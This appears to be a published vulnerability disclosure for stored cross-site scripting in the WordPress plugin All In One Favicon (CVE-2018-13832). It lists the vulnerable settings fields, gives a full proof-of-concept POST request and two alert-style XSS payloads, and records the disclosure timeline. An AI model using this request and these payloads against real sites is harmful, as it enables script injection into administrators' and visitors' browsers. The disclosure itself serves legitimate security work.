@@ -1,0 +1,95 @@
+# Exploit Title: WordPress Plugin All In One Favicon <= 4.6 - Authenticated Multiple XSS Persistent
+# Date: 2018-07-10
+# Exploit Author: Javier Olmedo
+ 
+# Website: https://hackpuntes.com/
+# Vendor Homepage: http://www.techotronic.de/
+# Software Link: https://wordpress.org/plugins/all-in-one-favicon/
+# Version/s: 4.6 and below
+# Patched Version: unpatched
+# CVE : 2018-13832
+# WPVULNDB: https://wpvulndb.com/vulnerabilities/9099
+ 
+Plugin description:
+All In One Favicon adds favicons to your site and your admin pages. You can either use favicons you already uploaded or use the builtin upload mechanism to upload a favicon to your WordPress installation.
+ 
+Description:
+WordPress Plugin All In One Favicon before 4.6 allows remote authenticated users to execute javascript code through XSS Persistent attacks.
+
+Technical details:
+
+The following parameters are vulnerable:
+backendApple-Text
+backendICO-Text
+backendPNG-Text
+backendGIF-Text
+frontendApple-Text
+frontendICO-Text
+frontendPNG-Text
+frontendGIF-Text
+ 
+Proof of Concept (PoC):
+The following POST request will cause it to display an alert in the browser when it runs as an authenticated user with permissions:
+
+POST /wordpress/wp-admin/admin-post.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/wordpress/wp-admin/options-general.php?page=all-in-one-favicon%2Fall-in-one-favicon.php
+Content-Type: multipart/form-data; boundary=---------------------------168911549614148
+Content-Length: 3407
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------168911549614148
+Content-Disposition: form-data; name="_wpnonce"
+
+9df031414d
+-----------------------------168911549614148
+Content-Disposition: form-data; name="_wp_http_referer"
+
+/wordpress/wp-admin/options-general.php?page=all-in-one-favicon%2Fall-in-one-favicon.php
+-----------------------------168911549614148
+Content-Disposition: form-data; name="option_page"
+
+aio-favicon_settings
+-----------------------------168911549614148
+Content-Disposition: form-data; name="aio-favicon_settings[frontendICO-text]"
+
+"><img src=a onerror=alert(1)>
+-----------------------------168911549614148
+Content-Disposition: form-data; name="action"
+
+aioFaviconUpdateSettings
+-----------------------------168911549614148
+Content-Disposition: form-data; name="aioFaviconUpdateSettings"
+
+Guardar cambios
+-----------------------------168911549614148
+
+Content-Disposition: form-data; name="action"
+
+aioFaviconUpdateSettings
+-----------------------------168911549614148
+Content-Disposition: form-data; name="aio-favicon_settings[removeLinkFromMetaBox]"
+
+true
+-----------------------------168911549614148
+Content-Disposition: form-data; name="action"
+
+aioFaviconUpdateSettings
+-----------------------------168911549614148--
+
+Payloads:
+"><img src=a onerror=alert(1)>
+"><img src=a onerror=alert(String.fromCharCode(88,83,83))>
+
+Timeline:
+15/03/2018 I send the report. (no answer)
+27/05/2018 I send the report, again. (no answer)
+10/07/2018 Public disclosure.
+
+References:
+https://hackpuntes.com/cve-2018-13832-wordpress-plugin-all-in-one-favicon-4-6-autenticado-multiples-cross-site-scripting-persistentes/
